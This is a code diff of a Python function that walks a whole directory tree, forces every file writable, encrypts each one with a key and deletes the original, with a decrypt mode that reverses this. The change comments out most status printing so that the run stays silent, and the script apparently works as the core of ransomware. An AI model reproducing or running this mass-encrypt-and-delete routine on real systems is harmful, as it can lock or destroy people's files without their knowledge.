@@ -95,31 +95,25 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             
             filename = os.path.join(subdir, file)#this makes the filename include its path
             #windows will throw an error if you just tell it to delete/access example.txt
-            
-            
-            try:#this is not needed actually...
                 
-                print(filename)
-                newFile = file
-                newFile += "a"    
-                newFilename = os.path.join(subdir, file)
-                try:
-                    os.rename(filename, newFilename)#checks if file in use by OS
+            print(filename)
+            newFile = file
+            newFile += "a"    
+            newFilename = os.path.join(subdir, file)#changes the filename
+            try:
+                os.rename(filename, newFilename)#checks if file in use by OS
                     
-                except:
-                    print("File is in use.")
-                    filesInUse +=1
-                    continue
-                try:
-                    os.chmod(filename, stat.S_IWRITE)#makes file writable if its read only
-                    os.chmod(filename, stat.S_IWUSR)
-                except:
-                    times +=1
+            except:
+                #print("File is in use.")
+                filesInUse +=1
+                continue
+            try:
+                os.chmod(filename, stat.S_IWRITE)#makes file writable if its read only
+                os.chmod(filename, stat.S_IWUSR)
+            except:
+                times +=1
                         
-            except IOError:
-                print("dont know")
-                dontKnow += 1
-                continue    
+              
             os.rename(newFilename, filename)#returns the file to its original name
             
             
@@ -128,9 +122,9 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     try:#attempts to encrypt the file
                         encrypt_file(key, filename, None, 64*1024)
                         filesChanged += 1
-                        print(filesChanged)
+                        #print(filesChanged)
                     except:
-                        print("Permission denied")   
+                        #print("Permission denied")   
                         permissionDenied += 1 
                     try: 
                         
@@ -140,28 +134,22 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                             deleted += 1
                             
                     except OSError:#sometimes windows wont let you delete something
-                            print("cant delete :(")
+                            #print("cant delete :(")
                             unDeleteable += 1
             elif function == 1:
                 try:#tries to decrypt the file
                     decrypt_file(key, filename, None, 64*1024)
                 except:
-                    print("Permission denied")    
+                    #print("Permission denied")    
                     permissionDenied += 1 
                 try: 
                     
-                    if ".enc" in filename:
+                    if ".enc" in filename:#deltes the encrypted files, they are no longer needed
                         os.remove(filename)
                         deleted += 1
                 except OSError:
-                    print("cant delete :(")
+                    #print("cant delete :(")
                     unDeleteable += 1
     
-    print(filesChanged)
-    print(filesInUse)
-    print(permissionDenied)
-    print(unDeleteable)
-    print(dontKnow)
-    print(deleted)   
-    print(times)             
+        
     return filesChanged                       
